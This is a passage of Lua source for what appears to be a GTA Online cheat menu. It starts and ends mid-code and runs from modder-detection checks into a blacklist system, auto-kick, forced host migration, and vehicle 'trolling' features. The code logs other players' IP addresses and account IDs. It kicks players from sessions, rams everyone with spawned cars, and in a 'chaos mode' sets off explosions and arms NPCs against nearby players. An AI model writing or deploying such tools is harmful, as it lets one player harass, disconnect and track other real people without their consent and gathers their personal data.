						globals.get_player_team_deathmatch_wins(pid),
						globals.get_player_deathmatch_wins(pid),
						globals.get_player_horde_wins(pid),
						globals.get_player_missions_created(pid),
						globals.get_player_arm_wins(pid),
						globals.get_player_BJ_wins(pid),
						globals.get_player_dart_wins(pid),
						globals.get_player_race_best_laps(pid),
						globals.get_player_deathmatch_top3(pid),
						globals.get_player_mc_win(pid)
					}
				system.yield(0)
				local severity = 0
				local what_flags_they_have_text = ""
				if their_rank < 100 and how_much_money_they_have > 25000000 then
					severity = severity + 1
					what_flags_they_have_text = what_flags_they_have_text..language["Has a lot of money & low rank. /;/msg|_|"].."\n"
				elseif how_much_money_they_have > ((their_rank / 200) * 1000000) * their_rank + 5000000 then
					severity = severity + 1
					what_flags_they_have_text = what_flags_they_have_text..language["Has too much money for the rank. /;/msg|_|"].."\n"
				elseif how_much_money_they_have > 120000000 or 0 > how_much_money_they_have then
					severity = severity + 1
					what_flags_they_have_text = what_flags_they_have_text..language["Has a lot of money. /;/msg|_|"].."\n"
				end
				if their_rank < 0 or their_kd < 0 then
					severity = severity + 3
					if their_rank < 0 then
						what_flags_they_have_text = what_flags_they_have_text..language["Has Negative lvl /;/msg|_|"].."\n"
					end
					if their_kd < 0 then
						what_flags_they_have_text = what_flags_they_have_text..language["Has Negative k/d /;/msg|_|"].."\n"
					end
				end
				system.yield(10)
				if their_rank > 1000 then
					severity = severity + 1
					what_flags_they_have_text = what_flags_they_have_text..language["Has a high rank. /;/msg|_|"].."\n"
				end
				if their_kd > 8 then
					severity = severity + 1
					what_flags_they_have_text = what_flags_they_have_text..language["Has a high k/d. /;/msg|_|"].."\n"
				end
				if player.get_player_armour(pid) > 50 then
					severity = severity + 3
					what_flags_they_have_text = what_flags_they_have_text..language["Has modded armor. /;/msg|_|"].."\n"
				end
				for i, stat_int in pairs(misc_stats) do
					system.yield(0)
					if stat_int > math.max(math.min(their_rank * 3.5 + 200, 1100), 53) then
						severity = severity + 1
						what_flags_they_have_text = what_flags_they_have_text..language["Has too many wins. /;/msg|_|"].."\n"
						break
					end
				end
				if player.is_player_valid(pid) and severity >= setting["Modded stats severity"] then
					player.set_player_as_modder(pid, keks_custom_modder_flags[1][1])
					people_stat_detected[RID] = true
					msg(player.get_player_name(pid).." "..language["has: /;/msg|_|"].."\n"..what_flags_they_have_text..language["severity: /;/msg|_|"].." "..severity, 6, true)
				end
			end
		end

	-- Modded scid detection
		toggle[#toggle + 1] = {"Modded scid detection", menu.add_feature(language["Modded scid detection /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			setting["Modded scid detection"] = true
			while f.on do
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(pid))) and player.player_id() ~= pid and not player.is_player_modder(pid, 8) then
						local RID = player.get_player_scid(pid)
						if RID > 2147483647 or 100000 > RID then
							msg(player.get_player_name(pid).." "..language["has a modded scid. /;/msg|_|"], 6, true)
							player.set_player_as_modder(pid, 8)
						end 
					end
					system.yield(0)
				end
			end
			setting["Modded scid detection"] = false
		end)}

	-- Modded name detection
		toggle[#toggle + 1] = {"Modded name detection", menu.add_feature(language["Modded name detection /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			setting["Modded name detection"] = true 
			while f.on do
				system.yield(500)
				for pid = 0, 31 do
					if player.is_player_valid(pid) and (not setting["Exclude friends from attacks #malicious#"] or not network.is_scid_friend(player.get_player_scid(pid))) and player.player_id() ~= pid and not player.is_player_modder(pid, keks_custom_modder_flags[7][1]) then
						local name = player.get_player_name(pid)
						local str = name:gsub("%.", "")
						local str = str:gsub("%-", "")
						local str = str:gsub("%_", "")
						if #name <= 5 or #name > 16 or str:find("%p") or name:match("(.*) (.*)") then
							local count = 0
							for pid = 0, 31 do
								random_wait(20)
								if player.get_player_name(pid) == name then
									count = count + 1
								end
								if count == 2 then
									break
								end
							end
							if count < 2 then
								msg(player.get_player_name(pid).." "..language["has a modded name. /;/msg|_|"], 6, true)
								player.set_player_as_modder(pid, keks_custom_modder_flags[7][1])
							end
						end 
					end
					system.yield(0)
				end
			end
			setting["Modded name detection"] = false
		end)}

	-- Modded net-event protection
		toggle[#toggle + 1] = {"Modded net event detection", menu.add_feature(language["Modded net event detection /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			if f.on then
				setting["Modded net event detection"] = true
			else
				setting["Modded net event detection"] = false
			end
		end)}

	-- Recognize modders
		toggle[#toggle + 1] = {"Blacklist", menu.add_feature(language["Blacklist /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			if f.on then
				setting["Blacklist"] = true
				u.check_if_player_is_in_blacklist = event.add_event_listener("player_join", function(p)
					local rid = player.get_player_scid(p.player)
					if player.player_id() ~= p.player and not network.is_scid_friend(rid) or not setting["Exclude friends from attacks #malicious#"] then 
						local name = player.get_player_name(p.player)
						local ip = player.get_player_ip(p.player)
						local token = dec_to_hex(player.get_player_host_token(p.player))
						local host_token = token:sub(math.min(1, #token), math.min(8, #token))
						if #host_token < 4 then
							host_token = "INVALID"
						end
						if #name < 1 then
							name = math.random(-math.pow(2, 61), math.pow(2, 62))
						end
						local tags, what_was_detected = search_for_match_and_get_line("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", {"/"..rid.."/", "|"..host_token.."|", "&"..ip.."&", "§"..name.."§"})
						if tags and what_was_detected then
							if what_was_detected:find("/") then
								what_was_detected = language["Rid /;/msg|_|"]..": "..what_was_detected:gsub("/", "")
							elseif what_was_detected:find("&") then 
								what_was_detected = language["IP /;/msg|_|"]..": "..ipv4_to_dec(what_was_detected:gsub("&", ""))
							elseif what_was_detected:find("§") then
								what_was_detected = language["Name /;/msg|_|"]..": "..what_was_detected:gsub("§", "")
							elseif what_was_detected:find("|") then
								what_was_detected = language["Host token /;/msg|_|"]..": "..what_was_detected:gsub("|", "")
							end
							msg(language["Recognized /;/msg|_|"].." "..name..language["\\nDetected: /;/msg|_|"].." "..what_was_detected..language["\\nTags:\\n /;/msg|_|"]..tags:match("<(.*)>"), 6, true)
							if setting[o.modder_flag_setting_properties[2][1]..keks_custom_modder_flags[3][2]] then
								kick(p.player)
								system.yield(2000)
							end
							player.set_player_as_modder(p.player, keks_custom_modder_flags[3][1])
						end
					end
				end)
			else
				setting["Blacklist"] = false
				event.remove_event_listener("player_join", u.check_if_player_is_in_blacklist)
				u.check_if_player_is_in_blacklist = nil
			end
		end)}

	-- Check stats automatically
		toggle[#toggle + 1] = {"Automatically check player stats", menu.add_feature(language["Check people's stats automatically /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			setting["Automatically check player stats"] = true
			while f.on do
				for pid = 0, 31 do
					if player.is_player_valid(pid) and player.player_id() ~= pid and not player.is_player_modder(pid, keks_custom_modder_flags[1][1]) then
						suspicious_stats(pid)
						system.yield(2000)
					end
					system.yield(0)
					if not f.on then
						break
					end
				end
			end
			setting["Automatically check player stats"] = false
		end)}

	-- Check session's stats
		menu.add_feature(language["Check everyone's stats /;/feature|_|"], "action", u.modder_detection.id, function()
			local me, mod = player.player_id(), keks_custom_modder_flags[1][1]
			for pid = 0, 31 do
				if player.is_player_valid(pid) and me ~= pid and not player.is_player_modder(pid, mod) then
					suspicious_stats(pid)
				end
			end
			msg(language["Checked lobby for suspicious stats /;/msg|_|"], 212, true)
		end)

	-- Check session if anyone's from the blacklist
		menu.add_feature(language["Check if anyone is in the blacklist /;/feature|_|"], "action", u.modder_detection.id, function()
			local me = player.player_id()
			for pid = 0, 31 do
				if player.is_player_valid(pid) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and not player.is_player_modder(pid, keks_custom_modder_flags[3][1]) and pid ~= me then
					system.yield(50)
					local rid = player.get_player_scid(pid)
					local name = player.get_player_name(pid)
					local ip = player.get_player_ip(pid)
					local token = dec_to_hex(player.get_player_host_token(pid))
					local host_token = token:sub(math.min(1, #token), math.min(8, #token))
					if #name < 1 then
						name = math.random(-math.pow(2, 61), math.pow(2, 62))
					end
					local tags, what_was_detected = search_for_match_and_get_line("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", {"/"..rid.."/", "|"..host_token.."|", "&"..ip.."&", "§"..name.."§"})
					if tags and what_was_detected then
						if what_was_detected:find("/") then
							what_was_detected = language["Rid /;/msg|_|"]..": "..what_was_detected:gsub("/", "")
						elseif what_was_detected:find("&") then 
							what_was_detected = language["IP /;/msg|_|"]..": "..ipv4_to_dec(what_was_detected:gsub("&", ""))
						elseif what_was_detected:find("§") then
							what_was_detected = language["Name /;/msg|_|"]..": "..what_was_detected:gsub("§", "")
						elseif what_was_detected:find("|") then
							what_was_detected = language["Host token /;/msg|_|"]..": "..what_was_detected:gsub("|", "")
						end
						msg(language["Recognized /;/msg|_|"].." "..name..language["\\nDetected: /;/msg|_|"].." "..what_was_detected..language["\\nTags:\\n /;/msg|_|"]..tags:match("<(.*)>"), 6, true)
						player.set_player_as_modder(pid, keks_custom_modder_flags[3][1])
					end
				end
			end
			msg(language["Checked blacklist. /;/msg|_|"], 212, true)
		end)

	-- Spectate detection
		toggle[#toggle + 1] = {"Modded spectate detection", menu.add_feature(language["Detect any modded spectate /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			setting["Modded spectate detection"] = true
			while f.on do
				local me = player.player_id()
				for pid = 0, 31 do
					local their_ped = player.get_player_ped(pid)
					local spectate_target = network.get_player_player_is_spectating(pid)
					if not player.is_player_modder(pid, keks_custom_modder_flags[5][1]) and player.is_player_valid(pid) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and me ~= pid and pid ~= spectate_target and spectate_target and not entity.is_entity_dead(their_ped) and interior.get_interior_from_entity(their_ped) == 0 then
						msg(player.get_player_name(pid).." "..language["is spectating /;/msg|_|"].." "..player.get_player_name(spectate_target)..".", 6, true)
						player.set_player_as_modder(pid, keks_custom_modder_flags[5][1])
					end
					system.yield(50)
				end
				system.yield(50)
			end					
			setting["Modded spectate detection"] = false
		end)}

	-- Off the radar detection
		toggle[#toggle + 1] = {"OTR detection", menu.add_feature(language["Detect too long off the radar /;/feature|_|"], "toggle", u.modder_detection_settings.id, function(f)
			setting["OTR detection"] = true
			while f.on do
				system.yield(50)
				local me = player.player_id()
				for pid = 0, 31 do
					system.yield(50)
					if player.is_player_valid(pid) and pid ~= me and not player.is_player_modder(pid, keks_custom_modder_flags[4][1]) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) then
						local rid = player.get_player_scid(pid)
						if not globals.is_player_otr(pid) then
							otr_table[rid] = 0
						elseif not otr_table[rid] or otr_table[rid] == 0 then
							otr_table[rid] = utils.time_ms() + 200000
						end
						local count, are_too_many_players_OTR = 0
						for pid = 0, 31 do
							system.yield(50)
							if globals.is_player_otr(pid) and pid ~= me then
								count = count + 1
							end
							if count > math.max(player.player_count() / 4, 2) then
								are_too_many_players_OTR = true
								break
							end
						end
						if not are_too_many_players_OTR and globals.is_player_otr(pid) and utils.time_ms() > otr_table[rid] then
							msg(player.get_player_name(pid).." "..language["was off the radar for too long. /;/msg|_|"], 6, true)
							player.set_player_as_modder(pid, keks_custom_modder_flags[4][1])
							otr_table[rid] = utils.time_ms() + 200000
						end
					end
				end
			end
			setting["OTR detection"] = false
		end)}

	-- Vote kick protection
		toggle[#toggle + 1] = {"Kick any vote kickers", menu.add_feature(language["Kick any vote kickers /;/feature|_|"], "toggle", u.protections.id, function(f)
			if f.on then
				setting["Kick any vote kickers"] = true	
			else
				setting["Kick any vote kickers"] = false
			end
		end)}

	-- Blacklist
		-- Add to blacklist function
			local function add_to_blacklist(name, ip, rid, host_token, reason, text)
				if #name < 1 then
					name = "INVALID_NAME_758349843"
				end
				if #reason == 0 then
					reason = "Manually added"
				end
				if #host_token < 4 then
					host_token = "INVALID"
				end
				local B = log("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", "§"..name.."§ /"..rid.."/ |"..host_token.."| &"..ip.."& <"..reason..">", {"/"..rid.."/", "|"..host_token.."|", "&"..ip.."&", "§"..name.."§"})
				if B then
					modify_entry("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", {B, B:match("(.*)<").."<"..reason..">"}, true, true)
					msg(language["Changed the reason this person was added to the blacklist. /;/msg|_|"], 212, text)
				else
					msg(language["Added to blacklist. /;/msg|_|"], 210, text)
					return true
				end
			end

		-- Remove from blacklist function
			local function remove_from_blacklist(name, ip, rid, host_token, text)
				if #name < 1 then
					name = math.random(-math.pow(2, 61), math.pow(2, 62))
				end
				local ip = tostring(ip)
				local rid = tostring(rid)
				if #ip < 1 then
					ip = "INVALID"
				end
				if ip:find(".") then
					ip = tostring(ipv4_to_dec(ip))
				end
				if #rid < 1 then
					rid = "INVALID"
				end
				if #host_token < 4 then
					host_token = "INVALID"
				end
				local result = modify_entry("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", {"/"..rid.."/", "|"..host_token.."|", "&"..ip.."&", "§"..name.."§"})
				if result == 1 then
					msg(language["Removed rid. /;/msg|_|"], 210, text)
				elseif result == 2 then 
					msg(language["Couldn't find player. /;/msg|_|"], 6, text)
				elseif result == 3 then
					msg(language["Blacklist file doesn't exist. /;/msg|_|"], 6, text)
				end
			end

		-- Add to blacklist
			menu.add_player_feature(language["Add player / modify reason they were added /;/player feature|_|"], "action", u.player_blacklist_features, function(f, pid)
				if pid == player.player_id() then
					msg(language["You can't add yourself to the blacklist... /;/msg|_|"], 212, true)
					return
				end
				local reason = get_input(language["Type in why you're adding this person. Typing in nothing makes the reason: Manually added. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				local token = dec_to_hex(player.get_player_host_token(pid))
				add_to_blacklist(player.get_player_name(pid), player.get_player_ip(pid), player.get_player_scid(pid), token:sub(math.min(1, #token), math.min(8, #token)), reason, true)
				player.set_player_as_modder(pid, keks_custom_modder_flags[3][1])
			end)

		-- Add to blacklist by RID
			menu.add_feature(language["Add player / modify reason they were added /;/feature|_|"], "action", u.blacklist.id, function()
				local scid = get_input(language["Type in social club ID, also known as: rid / scid. /;/input_does_not_support_unicode|_|"], "", 16, 3)
				if not scid or #tostring(scid) < 1 then
					msg(language["Rid is too short / invalid. /;/msg|_|"], 6, true)
					return
				end
				for pid = 0, 31 do
					if player.get_player_scid(pid) == tonumber(scid) then
						local token = dec_to_hex(player.get_player_host_token(pid))
						add_to_blacklist(player.get_player_name(pid), player.get_player_ip(pid), player.get_player_scid(pid), token:sub(math.min(1, #token), math.min(8, #token)), get_input(language["Type in why you're adding this person. Typing in nothing makes the reason: Manually added. /;/input_does_not_support_unicode|_|"], "", 128, 0))
						msg(language["Found player you were trying to add in your session. Added all their info. /;/msg|_|"], 210, true)
						return
					end
				end
				local ip = get_input(language["Type in ip. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				if ip:find(".") then
					ip = ipv4_to_dec(ip)
				end
				local reason = get_input(language["Type in why you're adding this person. Typing in nothing makes the reason: Manually added. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				local name = get_input(language["Type in their name. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				add_to_blacklist(name, ip, scid, "NO DATA NIL", reason, true)
				for pid = 0, 31 do
					if player.get_player_scid(pid) == scid then
						player.set_player_as_modder(pid, keks_custom_modder_flags[3][1])
					end
				end
			end)

		-- Remove RID from blacklist
			menu.add_feature(language["Remove player from blacklist /;/feature|_|"], "action", u.blacklist.id, function()
				local scid = get_input(language["Type in social club ID, also known as: rid / scid. /;/input_does_not_support_unicode|_|"], "", 16, 3, "", true)
				local ip = get_input(language["Type in ip. /;/input_does_not_support_unicode|_|"], "", 128, 0)
				remove_from_blacklist("", ip, scid, "", true)
			end)

		-- Add session to blacklist
			menu.add_feature(language["Add session to blacklist /;/feature|_|"], "action", u.blacklist.id, function()
				if player.player_count() == 1 then
					msg(language["Session is empty... /;/msg|_|"], 6, true)
					return
				end
				local reason = get_input(language["Type in the why you're adding everyone. Typing in nothing makes the reason: Manually added. /;/input_does_not_support_unicode|_|"], "", 128, 0, "Manually added")
				local me = player.player_id()
				local number_of_players_added = 0
				local number_of_players_modified = 0
				for pid = 0, 31 do
					if player.is_player_valid(pid) and pid ~= me then
						local token = dec_to_hex(player.get_player_host_token(pid))
						if add_to_blacklist(player.get_player_name(pid), player.get_player_ip(pid), player.get_player_scid(pid), token:sub(math.min(1, #token), math.min(8, #token)), reason) then
							number_of_players_added = number_of_players_added + 1
						else
							number_of_players_modified = number_of_players_modified + 1
						end
					end
				end
				msg(language["Added /;/msg|_|"].." "..number_of_players_added.." "..language["players to the blacklist.\\nChanged reasons for /;/msg|_|"].." "..number_of_players_modified.." "..language["people already in the blacklist /;/msg|_|"], 212, true)
			end)

		-- Remove session from blacklist
			menu.add_feature(language["Remove session from blacklist /;/feature|_|"], "action", u.blacklist.id, function()
				local me = player.player_id()
				for pid = 0, 31 do
					if player.is_player_valid(pid) and me ~= pid then
						local token = dec_to_hex(player.get_player_host_token(pid))
						remove_from_blacklist(player.get_player_name(pid), player.get_player_ip(pid), player.get_player_scid(pid), token:sub(math.min(1, #token), math.min(8, #token)))
					end
				end
				msg(language["Removed session from the blacklist. /;/msg|_|"], 212, true)
			end)

		-- Remove player from blacklist
			menu.add_player_feature(language["Remove player from blacklist /;/player feature|_|"], "action", u.player_blacklist_features, function(f, pid)
				local token = dec_to_hex(player.get_player_host_token(pid))
				remove_from_blacklist(player.get_player_name(pid), player.get_player_ip(pid), player.get_player_scid(pid), token:sub(math.min(1, #token), math.min(8, #token)), true)
			end)

-- Settings
	-- Init malicious basic toggles
		for i, k in pairs(general_settings) do
			if k[1]:find("#malicious") then
				toggle[#toggle + 1] = {k[1], menu.add_feature(k[3], "toggle", u.session_m_settings.id, function(f)
					if f.on then
						setting[k[1]] = true
					else
						setting[k[1]] = false
					end
				end)}
			end
		end

	-- Auto force host
		valuei["Max number of people to kick in force host"] = {"Max number of people to kick in force host", menu.add_feature(language["Max kicks for auto host /;/feature|_|"], "autoaction_value_i", u.session_m_settings.id, function(f)
			setting["Max number of people to kick in force host"] = f.value_i
		end)}
		valuei["Max number of people to kick in force host"][2].max_i, valuei["Max number of people to kick in force host"][2].min_i, valuei["Max number of people to kick in force host"][2].mod_i = 31, 1, 1

		toggle[#toggle + 1] = {"Force host", menu.add_feature(language["Get host automatically /;/feature|_|"], "toggle", u.session_m_settings.id, function(f)
			setting["Force host"] = true
			while f.on do
				system.yield(100)
				local me = player.player_id()
				local is_friends, players_in_queue = {}
				if not network.network_is_host() then
					players_in_queue, is_friends = get_host(me, true)
				end
				if is_friends then
					local friends_still_in_queue, nothing = players_in_queue
					while f.on and setting["Exclude friends from attacks #malicious#"] and #friends_still_in_queue > 0 do 
						system.yield(500)
						nothing, friends_still_in_queue = get_people_in_front_of_person_in_host_queue(me)
					end
				else
					local numbers_of_people_in_front_of_you_in_host_queue = players_in_queue
					while f.on and #numbers_of_people_in_front_of_you_in_host_queue > setting["Max number of people to kick in force host"] do
						system.yield(500)
						numbers_of_people_in_front_of_you_in_host_queue = get_people_in_front_of_person_in_host_queue(me)
					end
				end
				while f.on and network.network_is_host() do
					system.yield(500)
				end
			end
			setting["Force host"] = false
		end)}

	-- Log modders
		toggle[#toggle + 1] = {"Log modders", menu.add_feature(language["Log modders with selected tags to blacklist /;/feature|_|"], "toggle", u.what_to_do_with_tags.id, function(f)
			setting["Log modders"] = true
			while f.on do
				for pid = 0, 31 do
					system.yield(10)
					if player.is_player_valid(pid) and player.is_player_modder(pid, -1) and not player.is_player_modder(pid, keks_custom_modder_flags[3][1]) and player.get_player_modder_flags(pid) ~= keks_custom_modder_flags[2][1] and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) then
						local number_of_flags, modder_flags = get_all_modder_flags(pid, o.modder_flag_setting_properties[1][1])
						if number_of_flags > 0 then
							local name = player.get_player_name(pid)
							local rid = player.get_player_scid(pid)
							local ip = player.get_player_ip(pid)
							local token = dec_to_hex(player.get_player_host_token(pid))
							local host_token = token:sub(math.min(1, #token), math.min(8, #token))
							if #host_token < 4 then
								host_token = "INVALID"
							end
							if #name < 1 then
								name = math.random(-math.pow(2, 61), math.pow(2, 62))
							end
							log("scripts\\kek_menu_stuff\\kekMenuLogs\\Blacklist.log", "§"..name.."§ /"..rid.."/ |"..host_token.."| &"..ip.."& <"..modder_flags..">", {"/"..rid.."/", "|"..host_token.."|", "&"..ip.."&", "§"..name.."§"})
						end
					end
				end
				system.yield(600)
			end
		setting["Log modders"] = false
		end)}

	-- Auto kicker
		toggle[#toggle + 1] = {"Auto kicker", menu.add_feature(language["Auto kick modders with selected tags /;/feature|_|"], "toggle", u.what_to_do_with_tags.id, function(f)
			setting["Auto kicker"] = true
			while f.on do
				local me = player.player_id()
				for pid = 0, 31 do
					system.yield(75)
					if player.is_player_valid(pid) and player.is_player_modder(pid, -1) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and pid ~= me then
						local number_of_flags, modder_flags = get_all_modder_flags(pid, o.modder_flag_setting_properties[2][1])
						if number_of_flags > 0 then
							if setting["Log modders"] then
								system.yield(3000)
							end
							local number_of_flags, modder_flags = get_all_modder_flags(pid, o.modder_flag_setting_properties[2][1])
							if number_of_flags > 0 then
								msg(language["Kicking /;/msg|_|"].." "..player.get_player_name(pid)..language[", flags:\\n /;/msg|_|"]..modder_flags, 212, setting["Auto kicker #notifications#"])
								kick(pid)
							end
						end
					end
				end
				system.yield(75)
			end
			setting["Auto kicker"] = false
		end)}

	-- Auto unmark
		toggle[#toggle + 1] = {"Auto unmark", menu.add_feature(language["Auto unmark modders with selected tags /;/feature|_|"], "toggle", u.what_to_do_with_tags.id, function(f)
			setting["Auto unmark"] = true
			while f.on do
				for pid = 0, 31 do
					system.yield(0)
					if player.is_player_valid(pid) and player.is_player_modder(pid, -1) then
						for i, k in pairs(modIdStuff) do
							if setting["Unmark people with ".. player.get_modder_flag_text(k)] and player.is_player_modder(pid, k) then
								player.unset_player_as_modder(pid, k)
							end
						end
					end
					system.yield(0)
				end
				system.yield(0)
			end
			setting["Auto unmark"] = false
		end)}

-- Vehicle stuff
	-- Vehicle ram speed
		menu.add_feature(language["Ram vehicle speed /;/feature|_|"], "action", u.vehicle_trolling.id, function() 
			setting["Ram speed"] = get_input(language["Type in ram speed /;/input_does_not_support_unicode|_|"], "", 5, 3, 120) 
		end)
		u.ram_speed_player = menu.add_player_feature(language["Ram vehicle speed /;/player feature|_|"], "autoaction_value_i", u.player_trolling_features, function(f, pid) 
			if controls.is_disabled_control_pressed(0, 215) then
				local v = get_input(language["Type in ram speed /;/input_does_not_support_unicode|_|"], "", 4, 0, setting["Ram speed"])
				value_i_setup(f, v)
			end
			setting["Ram speed"] = f.value_i
			player_value_i_init(u.ram_speed_player, nil, nil, nil, f.value_i)
		end)
		player_value_i_init(u.ram_speed_player, 1000, 1, 10, setting["Ram speed"])

	-- Ram everyone
		menu.add_feature(language["Ram everyone /;/feature|_|"], "action", u.vehicle_trolling.id, function()
			local me = player.player_id()
			local e = {}
			local hash = vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use)
			for pid = 0, 31 do
				if player.is_player_valid(pid) and (not network.is_scid_friend(player.get_player_scid(pid)) or not setting["Exclude friends from attacks #malicious#"]) and not player.is_player_god(pid) and me ~= pid then
					e[#e + 1] = spawn_and_push_a_vehicle_in_direction(pid, false, 8, hash, true, v3())
				end
			end
			system.yield(350)
			clear_entities(e)
		end)

	-- Give nearby vehicles an effect
		u.nearby_type = menu.add_feature(language["Effect type, click me /;/feature|_|"], "action_value_i", u.vehicle_friendly.id, function()
			msg(language["1: Max cars\\n2: Give godmode\\n3: Repair cars\\n4: Godmode & max\\n5: Chaos mode /;/msg|_|"], 140, true)
		end)
		u.nearby_type.min_i, u.nearby_type.max_i, u.nearby_type.value_i, u.nearby_type.mod_i = 1, 5, 1, 1

		menu.add_feature(language["Apply effect to nearby vehicles /;/feature|_|"], "toggle", u.vehicle_friendly.id, function(f)
			local vehicle_effect_functions = 
			{function(car)
				max_car(car)
			end,
			function(car)
				modify_entity_godmode(car, true)
			end,
			function(car)
				if get_control_of_entity(car) then
					vehicle.set_vehicle_fixed(car)
				end
			end,
			function(car)
				modify_entity_godmode(car, true)
				max_car(car)
			end,
			function(car, my_ped, cars)
				local closest_player = get_closest_player()
				if math.random(1, 300) == 1 then
					for i = 1, 10 do
						fire.add_explosion(entity.get_entity_coords(cars[math.random(1, #cars)]), 29, true, false, 0, player.get_player_ped(closest_player))
					end
				end
				if math.random(1, 10) == 1 then
					fire.add_explosion(entity.get_entity_coords(car) + v3(math.random(-120, 120), math.random(-120, 120), 0), math.random(0, 73), true, false, 0, player.get_player_ped(closest_player))
				end
				if math.random(1, 50) == 1 then
					max_car(car)
				end
				if math.random(1, 70) == 1 then
					local Ped = vehicle.get_ped_in_vehicle_seat(car, -1)
					if Ped then
						glitch_vehicle(Ped)
					end
				end
				if math.random(1, 20) == 1 then
					local Ped = vehicle.get_ped_in_vehicle_seat(car, -1)
					if not ped.is_ped_a_player(Ped) and get_control_of_entity(Ped) then
						weapon.give_delayed_weapon_to_ped(Ped, 2874559379, 0, 1)
						set_combat_attributes(Ped, false, true, true)
						ai.task_combat_ped(Ped, player.get_player_ped(closest_player), 0, 16)
					end
				end
				if math.random(1, 16) == 1 and get_control_of_entity(car) then
					vehicle.set_vehicle_forward_speed(car, math.random(25, 200))
				elseif math.random(1, 16) == 1 and get_control_of_entity(car) then
					for i = 1, math.random(3, 10) do
						local car = cars[math.random(1, #cars)]
						local pos = entity.get_entity_coords(car) + v3(math.random(-30, 30), math.random(-30, 30), math.random(-6, 18))
						entity.apply_force_to_entity(car, 3, pos.x, pos.y, pos.z, math.random(-50, 50), math.random(-50, 50), math.random(-12, 25), true, true)
					end
				end
			end}
			while f.on do
				local my_ped = get_ped_closest_to_your_pov()
				local cars = vehicle.get_all_vehicles()
				if u.nearby_type.value_i == 5 then
					cars = remove_player_entities(cars)
				end
				table.sort(cars, function(a, b) return (get_distance_between(a, my_ped) < get_distance_between(b, my_ped)) end)
				local temp = {}
				for i = 1, 20 do
					temp[i] = cars[i]
				end
				cars = temp
				for i, k in pairs(cars) do
					if not entity.is_entity_dead(k) then
						vehicle_effect_functions[u.nearby_type.value_i](k, my_ped, cars)
						system.yield(math.random(30, 120))
					end
				end
				cars = remove_player_entities(cars)
				for i = 1, #cars do
					entity.set_entity_as_no_longer_needed(cars[i])
				end
				system.yield(0)
				if not f.on then
					clear_entities(cars)
				end
			end
		end)

	-- Swap nearby cars
		menu.add_feature(language["Swap nearby cars /;/feature|_|"], "toggle", u.vehicle_friendly.id, function(f)
			while f.on do
				system.yield(1000)
				local vehicles = get_table_of_entities_with_respect_to_distance_and_set_limit
				(
					{
						{
							get_table_of_close_entity_type(1),
							40,
							true,
							250
						}
					},
					get_ped_closest_to_your_pov()
				)
				local hash
				for i, car in pairs(vehicles) do
					system.yield(0)
					hash = vehicle_mapper.GetHashFromModel(txt.what_vehicle_model_in_use)
					if entity.get_entity_model_hash(car) ~= hash and get_control_of_entity(car) then
						local pos = entity.get_entity_coords(car)
						local dir = entity.get_entity_heading(car)
						local passengers, is_there_player = get_number_of_passengers(car)
						if not is_there_player then
							if clear_entities(table.merge(passengers, {{car}})) then
								local car = spawn_entity(hash, pos, dir)
								max_car(car)
								if entity.is_an_entity(car) and #passengers > 0 then
									local Ped = spawn_entity(pedestrian_mapper.GetHashFromModel("?"), pos + v3(0, 0, i * 2), 0, false, false, 4)
									if entity.is_an_entity(Ped) then
										set_combat_attributes(Ped, false, true, false, true, true, true, false, true, true, true, true, true)
										ped.set_ped_into_vehicle(Ped, car, -1)
										ai.task_vehicle_drive_wander(Ped, car, 120, get_random_drive_style())
									end
								end
							end
						end
					end
				end
				for i, car in pairs(remove_player_entities(get_table_of_close_entity_type(1))) do
					system.yield(0)
					local passengers, is_there_player = get_number_of_passengers(car)
					if not is_there_player and entity.get_entity_model_hash(car) == hash and (entity.is_entity_dead(car) or get_distance_between(get_ped_closest_to_your_pov(), car) > 250) then
						clear_entities(table.merge(passengers, {{car}}))
					end
				end
			end
		end)

	-- Vehicle fly nearby cars
		menu.add_feature(language["Vehicle fly nearby vehicles /;/feature|_|"], "toggle", u.vehicle_friendly.id, function(f)
			while f.on do
				system.yield(0)
				local control_indexes, controller_group
				if setting["Controller hotkey mode"] then
					control_indexes = {32, 8}
					controller_group = 2
				else
					controller_group = 0
					control_indexes = {32, 33}
				end
				local cars = get_table_of_entities_with_respect_to_distance_and_set_limit
					(
						{
							{
								get_table_of_close_entity_type(1),
								35,
								true
							}
						},
						get_ped_closest_to_your_pov()
					)
				for i = 1, 2 do
					while f.on and controls.is_disabled_control_pressed(controller_group, control_indexes[i]) do
						system.yield(0)
						local speed = {setting["Vehicle fly speed"], -setting["Vehicle fly speed"]}
						for car_i = 1, #cars do
							network.request_control_of_entity(cars[car_i])
							if network.has_control_of_entity(cars[car_i]) then
								entity.set_entity_rotation(cars[car_i], cam.get_gameplay_cam_rot())
								entity.set_entity_max_speed(cars[car_i], 45000)
								vehicle.set_vehicle_forward_speed(cars[car_i], speed[i])
							end
						end
					end
				end
				while f.on and not controls.is_disabled_control_pressed(controller_group, control_indexes[1]) and not controls.is_disabled_control_pressed(controller_group, control_indexes[2]) do
					system.yield(0)
					for car_i = 1, #cars do
						network.request_control_of_entity(cars[car_i])
						if network.has_control_of_entity(cars[car_i]) then
							entity.set_entity_velocity(cars[car_i], v3())
